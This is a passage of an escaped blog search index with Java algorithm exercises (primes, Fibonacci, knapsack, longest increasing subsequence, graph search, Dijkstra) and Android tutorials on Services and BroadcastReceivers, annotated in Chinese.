\u0026amp;\u0026amp; c \u0026gt;= 100 \u0026amp;\u0026amp; c \u0026lt; 1000 \u0026amp;\u0026amp; x * y \u0026gt;= 10000 \u0026amp;\u0026amp; x * y \u0026lt; 100000 \u0026amp;\u0026amp; b(x) \u0026amp;\u0026amp; b(y) \u0026amp;\u0026amp; b(a) \u0026amp;\u0026amp; b(b) \u0026amp;\u0026amp; b(c) \u0026amp;\u0026amp; b(x * y)) { System.out.println(x + \u0026#34; \u0026#34; + y + \u0026#34; \u0026#34; + a + \u0026#34; \u0026#34; + b + \u0026#34; \u0026#34; + c + \u0026#34; \u0026#34; + x * y); } } a(x + 1); } } private static boolean b(int i) { for (; i != 0; i /= 10) { int j = i % 10; ints[j]++; if (ints[j] == 3) { return false; } } return true; } } ---- 输出： 179 224 716 358 358 40096 地产大亨 public class Main { private static int[] ints = new int[10];//下标为指数，值为个数 public static void main(String[] args) { a(0); } private static void a(int k) { if (k \u0026gt; ints.length - 1) { return; } else { for (int i = 0; i \u0026lt; 6; i++) { ints[k] = i; if (b(k)) { a(k + 1); } } } } private static boolean b(int k) { double sum = 0; for (int i = 0; i \u0026lt;= k; i++) { sum += Math.pow(7, i) * ints[i]; } if (sum == 1000000) { StringBuilder s = new StringBuilder(); int n = 0; for (int i = 0; i \u0026lt;= k; i++) { s.append(ints[i]); n += ints[i]; } System.out.println(s); System.out.println(n); System.exit(0);//结束运行 } return sum \u0026lt; 1000000; } } ---- 输出： 11333311 16 ------------------------------------------------------- public class Main { public static void main(String[] args) { String s = Integer.toString(1000000, 7); int n = 0; for (int i = Integer.parseInt(s); i != 0; i /= 10) {//遍历数的每一位 n += i % 10; } System.out.println(s); System.out.println(n); } } ---- 输出： 11333311 16 质数判断 import java.util.Scanner; public class Main { public static void main(String[] args) { int i = new Scanner(System.in).nextInt(); if (a(i)) { System.out.println(\u0026#34;yes\u0026#34;); } else { System.out.println(\u0026#34;no\u0026#34;); } } private static boolean a(int i) { if (i \u0026lt;= 3) { return i \u0026gt; 1; 2 和 3 是质数 } for (int j = 2; j \u0026lt; Math.sqrt(i); j++) { if (i % j == 0) { return false; 能够被 1 和其本身之外的数整除的数不是质数 } } return true; } } 质数：除了 1 和其本身之外再无其他因数。（例如 2、3、5、7 是，4、6、8、9 不是） 煤球数目 import java.util.Scanner; public class Main { public static void main(String[] args) { int i = new Scanner(System.in).nextInt(); int j = 0; int x = 0; long sum = 0; for (int k = 0; k \u0026lt; i; k++) { j++; x += j; sum += x; } System.out.println(sum); } } 平方怪圈 import java.util.Scanner; public class Main { public static void main(String[] args) { int i = new Scanner(System.in).nextInt(); for (int j = 0; j \u0026lt; 100; j++) { char[] chars = String.valueOf(i).toCharArray(); i = 0; for (char c : chars) { int temp = Integer.valueOf(String.valueOf(c)); 此方法创建了多个对象，内存使用率较高 i += (temp * temp); } System.out.println(i); } } } ------------------------------------------------------- 遍历数的每一位 public class Main { public static void main(String[] args) { int i = 1234567; while (i != 0) { 第 1 种 System.out.println(i % 10); i /= 10; } for (; i != 0; i /= 10) { 第 2 种 System.out.println(i % 10); } // System.out.println(i / 1 % 10); // System.out.println(i / 10 % 10); // System.out.println(i / 100 % 10); // System.out.println(i / 1000 % 10); // System.out.println(i / 10000 % 10); // System.out.println(i / 100000 % 10); // System.out.println(i / 1000000 % 10); } } ---- 输出： 7 6 5 4 3 2 1 ------------------------------------------------------- 改进版本 import java.util.Scanner; public class Main { public static void main(String[] args) { int i = new Scanner(System.in).nextInt(); for (int j = 0; j \u0026lt; 100; j++) { int sum = 0; while (i \u0026gt; 0) { int x = i % 10; sum += (x * x); i /= 10; } i = sum; System.out.println(i); } } } 报数游戏 import java.util.Arrays; public class Main { public static void main(String[] args) { // Scanner scanner = new Scanner(System.in); // int n = scanner.nextInt(); // int m = scanner.nextInt(); int n = 15; int m = 3; int[] ints = new int[n];//0 未出局，1 已出局 int out = 0;//出局人数 int count = 0;//计数器 while (out != n - 1) { for (int i = 0; i \u0026lt; ints.length; i++) { if (ints[i] != 1) { count++; if (count == m) { ints[i] = 1; count = 0; out++; } } } } System.out.println(Arrays.toString(ints)); for (int i = 0; i \u0026lt; ints.length; i++) { if (ints[i] == 0) { System.out.println(i + 1); break; } } } } ---- 输出： [1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1] 5 立方尾不变 public class Main { public static void main(String[] args) { int count = 0; for (int i = 1; i \u0026lt;= 10000; i++) { long j = (long) Math.pow(i, 3); if (i == j % (long) Math.pow(10, a(i))) { count++; } } System.out.println(count); } private static int a(int i) {//返回数字的位数 int n = 0; while (i != 0) { n++; i /= 10; } return n; } } ---- 输出： 36 汉诺塔 public class Main { public static void main(String[] args) { move(3, 1, 3); } private static void move(int n, int start, int end) { if (n == 0) { return; } int auxiliary = 6 - start - end; move(n - 1, start, auxiliary); System.out.printf(\u0026#34;Move %d from %d -\u0026gt; %d\\n\u0026#34;, n, start, end); move(n - 1, auxiliary, end); } } ---- 输出： Move 1 from 1 -\u0026gt; 3 Move 2 from 1 -\u0026gt; 2 Move 1 from 3 -\u0026gt; 2 Move 3 from 1 -\u0026gt; 3 Move 1 from 2 -\u0026gt; 1 Move 2 from 2 -\u0026gt; 3 Move 1 from 1 -\u0026gt; 3 斐波那契数列 public class A { public static void main(String[] args) { int x = 1; int y = 1; boolean b = true; System.out.print(x + \u0026#34; \u0026#34;); System.out.print(y + \u0026#34; \u0026#34;); for (int i = 0; i \u0026lt; 10; i++) { 朴素解法 if (b) { b = false; x += y; System.out.print(x + \u0026#34; \u0026#34;); } else { b = true; y += x; System.out.print(y + \u0026#34; \u0026#34;); } } } } ---- 输出：（前 12 项斐波那契数列） 1 1 2 3 5 8 13 21 34 55 89 144 public class A { public static void main(String[] args) { System.out.println(fib(12)); } private static int fib(int i) { 递归 return i == 1 || i == 2 ? 1 : fib(i - 1) + fib(i - 2); } } ---- 输出： 144 public class A { private static final int[] ints = new int[12]; public static void main(String[] args) { ints[0] = 1; ints[1] = 1; System.out.println(fib(ints.length - 1)); } private static int fib(int i) { 动态规划（DP） if (ints[i] == 0) { ints[i] = fib(i - 1) + fib(i - 2); } return ints[i]; } } ---- 输出： 144 #include \u0026lt;stdio.h\u0026gt; #define N 12 int ints[N]; int fib(int i){ C 语言版动态规划 if (ints[i] == 0) { ints[i] = fib(i - 1) + fib(i - 2); } return ints[i]; } int main(){ ints[0] = 1; ints[1] = 1; printf(\u0026#34;%d\\n\u0026#34;, fib(N - 1)); } 01 背包 import java.util.Scanner; /* 3 50 10 60 20 100 30 120 http://www.importnew.com/13072.html https://github.com/tianyicui/pack */ public class Main { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); int n = scanner.nextInt();//物品数量 int m = scanner.nextInt();//背包体积 int[] w = new int[n];//物品体积 int[] v = new int[n];//物品价值 for (int i = 0; i \u0026lt; n; i++) { w[i] = scanner.nextInt(); v[i] = scanner.nextInt(); } System.out.println(a(w, v, n, m)); System.out.println(b(w, v, n, m)); } private static int a(int[] w, int[] v, int N, int W) {//v1 int[][] F = new int[N + 1][W + 1]; for (int i = 1; i \u0026lt;= N; i++) { for (int j = 1; j \u0026lt;= W; j++) { if (w[i - 1] \u0026lt;= j) { F[i][j] = Math.max(F[i - 1][j - w[i - 1]] + v[i - 1], F[i - 1][j]); } else { F[i][j] = F[i - 1][j]; } } } // https://github.com/tianyicui/pack/issues/6 // v1.5 过渡版本，有错误 (当 w_i \u0026gt; j 时，应当把 F[i - 1][j] 复制到 F[i][j]) // for (int i = 1; i \u0026lt;= N; i++) { // for (int j = w[i - 1]; j \u0026lt;= W; j++) { // F[i][j] = Math.max(F[i - 1][j - w[i - 1]] + v[i - 1], F[i - 1][j]); // } // } print(F); return F[N][W]; } private static int b(int[] w, int[] v, int N, int W) {//v2 int[] F = new int[W + 1]; for (int i = 1; i \u0026lt;= N; i++) { for (int j = W; j \u0026gt;= w[i - 1]; j--) { F[j] = Math.max(F[j - w[i - 1]] + v[i - 1], F[j]); } } print(F); return F[W]; } private static void print(int[] ints) { for (int i : ints) { System.out.printf(\u0026#34;%d\\t\u0026#34;, i); } System.out.println(); } private static void print(int[][] ints) { for (int[] anInt : ints) { for (int i : anInt) { System.out.printf(\u0026#34;%d\\t\u0026#34;, i); } System.out.println(); } } } ---- 输出： 0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t0 0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60 0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t100\t100\t100\t100\t100\t100\t100\t100\t100\t100\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160 0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t100\t100\t100\t100\t100\t100\t100\t100\t100\t100\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t180\t180\t180\t180\t180\t180\t180\t180\t180\t180\t220 220 0\t0\t0\t0\t0\t0\t0\t0\t0\t0\t60\t60\t60\t60\t60\t60\t60\t60\t60\t60\t100\t100\t100\t100\t100\t100\t100\t100\t100\t100\t160\t160\t160\t160\t160\t160\t160\t160\t160\t160\t180\t180\t180\t180\t180\t180\t180\t180\t180\t180\t220 220 最长递增子序列 import java.util.Scanner; /* 9 2 4 3 5 1 7 6 9 8 */ public class Main { public static void main(String[] args) {//v1 Scanner scanner = new Scanner(System.in); int N = scanner.nextInt(); int[] S = new int[N + 1];//元素 int[] L = new int[N + 1];//长度 int[] P = new int[N + 1];//前驱 S[0] = -1; P[0] = -1; for (int i = 1; i \u0026lt;= N; i++) { S[i] = scanner.nextInt(); } for (int i = 1; i \u0026lt;= N; i++) { for (int j = 0; j \u0026lt; i; j++) { if (S[j] \u0026lt; S[i] \u0026amp;\u0026amp; L[j] \u0026gt;= L[i]) { L[i] = L[j] + 1; P[i] = j; } } } print(S); print(L); print(P); b(S, P, a(L)); } private static int a(int[] L) { int max = -1;//最大长度 int pre = -1;//对应下标 for (int i = 0; i \u0026lt; L.length; i++) {//找到最大长度的下标 if (max \u0026lt; L[i]) { max = L[i]; pre = i; } } return pre; } private static void b(int[] S, int[] P, int pre) { while (true) {//根据前驱还原序列 System.out.print(S[pre]); pre = P[pre]; if (P[pre] == -1) { System.out.println(); break; } } } private static void print(int[] ints) { for (int i : ints) { System.out.printf(\u0026#34;%d\\t\u0026#34;, i); } System.out.println(); } } ---- 输出： -1\t2\t4\t3\t5\t1\t7\t6\t9\t8 0\t1\t2\t2\t3\t1\t4\t4\t5\t5 -1\t0\t1\t1\t2\t0\t4\t4\t6\t6 97542 import java.util.Scanner; /* 9 2 4 3 5 1 7 6 9 8 */ public class Main { public static void main(String[] args) {//v2，不用初始位 Scanner scanner = new Scanner(System.in); int N = scanner.nextInt(); int[] S = new int[N];//元素 int[] L = new int[N];//长度 int[] P = new int[N];//前驱 L[0] = 1; P[0] = -1; for (int i = 0; i \u0026lt; N; i++) { S[i] = scanner.nextInt(); } for (int i = 1; i \u0026lt; N; i++) { for (int j = 0; j \u0026lt; i; j++) { if (S[j] \u0026lt; S[i] \u0026amp;\u0026amp; L[j] \u0026gt;= L[i]) { L[i] = L[j] + 1; P[i] = j; } } } print(S); print(L); print(P); b(S, P, a(L)); } private static int a(int[] L) { int max = -1;//最大长度 int pre = -1;//对应下标 for (int i = 0; i \u0026lt; L.length; i++) {//找到最大长度的下标 if (max \u0026lt; L[i]) { max = L[i]; pre = i; } } return pre; } private static void b(int[] S, int[] P, int pre) { while (true) {//根据前驱还原序列 System.out.print(S[pre]); pre = P[pre]; if (pre == -1) { System.out.println(); break; } } } private static void print(int[] ints) { for (int i : ints) { System.out.printf(\u0026#34;%d\\t\u0026#34;, i); } System.out.println(); } } ---- 输出： 2\t4\t3\t5\t1\t7\t6\t9\t8 1\t2\t2\t3\t0\t4\t4\t5\t5 -1\t0\t0\t1\t0\t3\t3\t5\t5 97542 String reorder import java.util.Scanner; public class Main { private static final int[] MAP = new int[36]; // 下标为哈希后的元素，值为出现次数 public static void main(String[] args) { try (Scanner scanner = new Scanner(System.in)) { while (scanner.hasNextLine()) { String s = scanner.nextLine(); if (initHash(s)) { print(); } else { System.out.println(false); } reset(); } } } private static boolean initHash(String s) { // 初始化哈希表 final int len = s.length(); for (int i = 0; i \u0026lt; len; i++) { int pos = hash(s.charAt(i)); if (pos == -1) { return false; } else { MAP[pos]++; } } return true; } private static int hash(char c) { // 计算元素在哈希表中的位置 if (c \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; c \u0026lt;= \u0026#39;9\u0026#39;) { return c - \u0026#39;0\u0026#39;; } else if (c \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; c \u0026lt;= \u0026#39;z\u0026#39;) { return c - \u0026#39;a\u0026#39; + 10; } else { return -1; } } private static void print() { // 轮询哈希表输出字符 final int len = MAP.length; boolean printed; do { printed = false; for (int i = 0; i \u0026lt; len; i++) { if (MAP[i] \u0026gt; 0) { MAP[i]--; printed = true; if (i \u0026lt; 10) { System.out.print((char) (i + \u0026#39;0\u0026#39;)); } else { System.out.print((char) (i + \u0026#39;a\u0026#39; - 10)); } } } } while (printed); System.out.println(); } private static void reset() { // 重置哈希表 final int len = MAP.length; for (int i = 0; i \u0026lt; len; i++) { MAP[i] = 0; } } } 图 BFS/DFS import java.util.*; public class Main { private static final Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; GRAPH = new HashMap\u0026lt;\u0026gt;(); static { GRAPH.put(\u0026#34;A\u0026#34;, Arrays.asList(\u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;)); GRAPH.put(\u0026#34;B\u0026#34;, Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;)); GRAPH.put(\u0026#34;C\u0026#34;, Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;)); GRAPH.put(\u0026#34;D\u0026#34;, Arrays.asList(\u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;)); GRAPH.put(\u0026#34;E\u0026#34;, Arrays.asList(\u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;)); GRAPH.put(\u0026#34;F\u0026#34;, Arrays.asList(\u0026#34;D\u0026#34;)); } public static void main(String[] args) { String start = \u0026#34;A\u0026#34;; String end = \u0026#34;D\u0026#34;; Map\u0026lt;String, String\u0026gt; parent = run(GRAPH, start, true); System.out.println(parent); while (end != null) { System.out.println(end); end = parent.get(end); } } /** * flag: * true -\u0026gt; 作为队列 -\u0026gt; BFS（广度优先搜索） * false -\u0026gt; 作为堆栈 -\u0026gt; DFS（深度优先搜索） */ private static Map\u0026lt;String, String\u0026gt; run(final Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; graph, String vertex, final boolean flag) { final Deque\u0026lt;String\u0026gt; deque = new ArrayDeque\u0026lt;\u0026gt;(); final Set\u0026lt;String\u0026gt; seen = new HashSet\u0026lt;\u0026gt;(); final Map\u0026lt;String, String\u0026gt; parent = new HashMap\u0026lt;\u0026gt;(); deque.offerLast(vertex); seen.add(vertex); parent.put(vertex, null); while (!deque.isEmpty()) { vertex = flag ? deque.pollFirst() : deque.pollLast(); for (String node : graph.get(vertex)) { if (!seen.contains(node)) { deque.offerLast(node); seen.add(node); parent.put(node, vertex); } } } return parent; } } ---- 输出： {A=null, B=A, C=A, D=B, E=C, F=D} D B A Dijkstra import java.util.*; public class Main { private static final Map\u0026lt;String, List\u0026lt;Node\u0026gt;\u0026gt; GRAPH = new HashMap\u0026lt;\u0026gt;(); private static final String PARENT = \u0026#34;PARENT\u0026#34;; private static final String DISTANCE = \u0026#34;DISTANCE\u0026#34;; static { GRAPH.put(\u0026#34;A\u0026#34;, Arrays.asList(new Node(\u0026#34;B\u0026#34;, 5), new Node(\u0026#34;C\u0026#34;, 1))); GRAPH.put(\u0026#34;B\u0026#34;, Arrays.asList(new Node(\u0026#34;A\u0026#34;, 5), new Node(\u0026#34;C\u0026#34;, 2), new Node(\u0026#34;D\u0026#34;, 1))); GRAPH.put(\u0026#34;C\u0026#34;, Arrays.asList(new Node(\u0026#34;A\u0026#34;, 1), new Node(\u0026#34;B\u0026#34;, 2), new Node(\u0026#34;D\u0026#34;, 4), new Node(\u0026#34;E\u0026#34;, 8))); GRAPH.put(\u0026#34;D\u0026#34;, Arrays.asList(new Node(\u0026#34;B\u0026#34;, 1), new Node(\u0026#34;C\u0026#34;, 4), new Node(\u0026#34;E\u0026#34;, 3), new Node(\u0026#34;F\u0026#34;, 6))); GRAPH.put(\u0026#34;E\u0026#34;, Arrays.asList(new Node(\u0026#34;C\u0026#34;, 8), new Node(\u0026#34;D\u0026#34;, 3))); GRAPH.put(\u0026#34;F\u0026#34;, Arrays.asList(new Node(\u0026#34;D\u0026#34;, 6))); } public static void main(String[] args) { String start = \u0026#34;A\u0026#34;; String end = \u0026#34;D\u0026#34;; Map\u0026lt;String, Map\u0026lt;String, ?\u0026gt;\u0026gt; map = run(GRAPH, new Node(start, 0)); System.out.println(map); System.out.println(map.get(DISTANCE).get(end)); while (end != null) { System.out.println(end); end = (String) map.get(PARENT).get(end); } } private static Map\u0026lt;String, Map\u0026lt;String, ?\u0026gt;\u0026gt; run(final Map\u0026lt;String, List\u0026lt;Node\u0026gt;\u0026gt; graph, Node vertex) { final Queue\u0026lt;Node\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(); final Set\u0026lt;String\u0026gt; seen = new HashSet\u0026lt;\u0026gt;(); final Map\u0026lt;String, String\u0026gt; parent = new HashMap\u0026lt;\u0026gt;(); final Map\u0026lt;String, Integer\u0026gt; distance = new HashMap\u0026lt;\u0026gt;(); //init distance graph.keySet().forEach(node -\u0026gt; distance.put(node, Integer.MAX_VALUE)); queue.offer(vertex); parent.put(vertex.name, null); distance.put(vertex.name, vertex.dist); while (!queue.isEmpty()) { vertex = queue.poll(); seen.add(vertex.name); for (Node node : graph.get(vertex.name)) { if (!seen.contains(node.name)) { int dist = node.dist + vertex.dist; if (dist \u0026lt; distance.get(node.name)) { node.dist = dist; queue.offer(node); parent.put(node.name, vertex.name); distance.put(node.name, node.dist); } } } } Map\u0026lt;String, Map\u0026lt;String, ?\u0026gt;\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); result.put(PARENT, parent); result.put(DISTANCE, distance); return Collections.unmodifiableMap(result); } private static class Node implements Comparable\u0026lt;Node\u0026gt; { final String name; Integer dist; Node(String name, Integer dist) { this.name = name; this.dist = dist; } @Override public int compareTo(Node o) { return this.dist - o.dist; } } } ---- 输出： {DISTANCE={A=0, B=3, C=1, D=4, E=7, F=10}, PARENT={A=null, B=C, C=A, D=B, E=D, F=D}} 4 D B C A ","permalink":"https://xhstormr.github.io/blog/posts/java-algorithm/","summary":"","title":"Algorithm"},{"content":"Updated on 2016-10-16\n启动服务 调用 startService() 后服务便会在后台无限期运行，需手动停止服务。 如果服务已经启动，再调用 startService()，则只会调用 onStartCommand()。 MainActivity.java public class MainActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(this, MainActivity.class); PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0); 设置点击内容 Intent Notification.Builder builder = new Notification.Builder(this).setContentTitle(\u0026#34;标题\u0026#34;).setContentText(\u0026#34;内容\u0026#34;).setSmallIcon(R.mipmap.ic_launcher).setContentIntent(pendingIntent); 通知 NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE); 获得通知管理 notificationManager.notify(1, builder.build()); 显示状态栏通知（通知 ID，通知） } public void onClick(View view) { Intent intent = new Intent(MainActivity.this, MyService.class); intent.putExtra(\u0026#34;msg\u0026#34;, \u0026#34;信息\u0026#34;); switch (view.getId()) { case R.id.button1: startService(intent); 启动服务 break; case R.id.button2: stopService(intent); 停止服务（一旦调用了 startService，就必须手动停止服务） break; } } } MyService.java public class MyService extends Service { @Override public void onCreate() { 调用一次 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Service ---\u0026gt; 1onCreate\u0026#34;); super.onCreate(); Intent intent = new Intent(this, MainActivity.class); PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0); 设置点击内容 Intent Notification.Builder builder = new Notification.Builder(this).setContentTitle(\u0026#34;新标题\u0026#34;).setContentText(\u0026#34;新内容\u0026#34;).setSmallIcon(R.mipmap.ic_launcher).setContentIntent(pendingIntent); 通知 startForeground(1, builder.build()); 设置为前台服务（通知 ID，通知） } @Override public int onStartCommand(Intent intent, int flags, int startId) { startService 调用；处在 UI 线程，不应包含耗时操作，可以通过启动新线程来完成 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Service ---\u0026gt; 2onStartCommand\u0026#34; + intent); return super.onStartCommand(intent, flags, startId); } @Override public void onDestroy() { 调用一次 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Service ---\u0026gt; 3onDestroy\u0026#34;); super.onDestroy(); stopForeground(true); 取消前台服务（同时移除状态栏通知） } @Nullable @Override public IBinder onBind(Intent intent) { bindService 调用 return null; } } ---- 输出： 16307-16307/com.example.myapp.myapplication I/Tag: Service ---\u0026gt; 1onCreate 16307-16307/com.example.myapp.myapplication I/Tag: Service ---\u0026gt; 2onStartCommandIntent { cmp=com.example.myapp.myapplication/.MyService (has extras) } 16307-16307/com.example.myapp.myapplication I/Tag: Service ---\u0026gt; 2onStartCommandIntent { cmp=com.example.myapp.myapplication/.MyService (has extras) } 16307-16307/com.example.myapp.myapplication I/Tag: Service ---\u0026gt; 2onStartCommandIntent { cmp=com.example.myapp.myapplication/.MyService (has extras) } 16307-16307/com.example.myapp.myapplication I/Tag: Service ---\u0026gt; 3onDestroy activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;启动服务\u0026#34; android:id=\u0026#34;@+id/button1\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;停止服务\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; 绑定服务 绑定服务可以获得服务对象，获取服务的状态和数据并调用服务中的方法，与之通信。 通过 bindService() 启动的服务，通过 unbindService() 解绑后，如果没有绑定对象，服务会自动停止。 服务可以同时通过 startService() 和 bindService() 启动，但之后必须手动调用 stopService() 停止服务且停止时服务中没有绑定对象。 MainActivity.java public class MainActivity extends Activity { private MyService mService; private boolean mBound = false; private ServiceConnection mConnection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { 连接建立时调用，传递 onBind 返回的 IBinder 对象 MyService.MyBinder myBinder = (MyService.MyBinder) service; 向下类型转换（强制类型转换） mService = myBinder.getService(); 通过 MyBinder 提供的方法获得 Service 对象 mBound = true; } @Override public void onServiceDisconnected(ComponentName name) { 连接意外中断时调用 mBound = false; } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } @Override protected void onDestroy() { super.onDestroy(); if (mBound) { unbindService(mConnection); 取消绑定服务 mBound = false; } } public void onClick(View view) { Intent intent = new Intent(MainActivity.this, MyService.class); intent.putExtra(\u0026#34;msg\u0026#34;, \u0026#34;信息\u0026#34;); switch (view.getId()) { case R.id.button1: bindService(intent, mConnection, Context.BIND_AUTO_CREATE); 绑定服务 break; case R.id.button2: if (mBound) { unbindService(mConnection); 取消绑定服务（当服务没有绑定对象后，服务会自动停止） mBound = false; } break; case R.id.button3: if (mBound) { mService.getRandomNumber(); 调用 Service 对象中的方法 } break; } } } MyService.java public class MyService extends Service { private final Binder mBinder = new MyBinder(); @Override public void onCreate() { 调用一次 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Service ---\u0026gt; 1onCreate\u0026#34;); super.onCreate(); } @Nullable @Override public IBinder onBind(Intent intent) { bindService 调用，传递 IBinder Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Service ---\u0026gt; 2onBind\u0026#34;); return mBinder; } @Override public boolean onUnbind(Intent intent) { bindService 调用 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Service ---\u0026gt; 3onUnbind\u0026#34;); return super.onUnbind(intent); } @Override public void onDestroy() { 调用一次 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Service ---\u0026gt; 4onDestroy\u0026#34;); super.onDestroy(); } public void getRandomNumber() { 提供给外部调用的方法 Log.i(\u0026#34;Tag\u0026#34;, String.valueOf(((int) (Math.random() * 100)))); } public class MyBinder extends Binder { Binder 实现了 IBinder public MyService getService() { IBinder 提供获得 Service 对象的方法 return MyService.this; } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;启动服务\u0026#34; android:id=\u0026#34;@+id/button1\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;停止服务\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;使用服务\u0026#34; android:id=\u0026#34;@+id/button3\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; AndroidManifest.xml \u0026lt;application 其余组件 \u0026lt;activity android:name=\u0026#34;.MainActivity\u0026#34; android:launchMode=\u0026#34;singleInstance\u0026#34;\u0026gt; 注册 Activity \u0026lt;intent-filter\u0026gt; ↳ 只允许存在一个 Activity 实例 \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;service android:name=\u0026#34;.MyService\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; 注册服务 ↳ 禁止跨 App 使用（以 user id 为界） \u0026lt;/application\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-service/","summary":"","title":"Android Service"},{"content":"Updated on 2016-10-10\nBroadcast（发）：发送 Broadcast（Intent）用于进程或线程间进行通信。 普通广播：所有监听该广播的接收器都可以（理论上同时）接收到该广播。 动态注册的接收器 总是 先于静态注册的接收器收到广播。 并行处理。 有序广播：按照接收器的优先级顺序（链式）接收广播。（-1000 至 1000） 监听该广播的接收器可以中断传播，也可以放入数据传递给下一个接收器。 同等级 的动态注册的接收器先于静态注册的接收器收到广播。 串行处理。 BroadcastReceiver（收）：对 Broadcast 进行过滤接收并响应，四大组件之一。 静态注册：在 AndroidManifest.xml 中进行注册。( 常驻型 ) 动态注册：在运行时的 Java 代码中进行注册，程序结束后取消注册。( 非常驻型 ) MainActivity.java public class MainActivity extends Activity { private MyBroadcastReceiver mMyBroadcastReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mMyBroadcastReceiver = new MyBroadcastReceiver(); 广播接收器 IntentFilter intentFilter = new IntentFilter(\u0026#34;action1\u0026#34;); 过滤信息（匹配 Intent） intentFilter.setPriority(100); 优先级 registerReceiver(mMyBroadcastReceiver, intentFilter); 动态注册（广播接收器，过滤信息） } @Override protected void onDestroy() { super.onDestroy(); unregisterReceiver(mMyBroadcastReceiver); 取消动态注册（必须执行，以防内存泄漏） } public void onClick(View view) { Intent intent = new Intent(\u0026#34;action1\u0026#34;); 意图（行动） intent.setPackage(\u0026#34;com.example.myapp.myapplication\u0026#34;); 只发送至此包中与之匹配的接收器（安全） switch (view.getId()) { case R.id.button1: intent.putExtra(\u0026#34;msg\u0026#34;, \u0026#34;普通广播\u0026#34;); sendBroadcast(intent); 发送普通广播 break; case R.id.button2: intent.putExtra(\u0026#34;msg\u0026#34;, \u0026#34;有序广播\u0026#34;); sendOrderedBroadcast(intent, null); 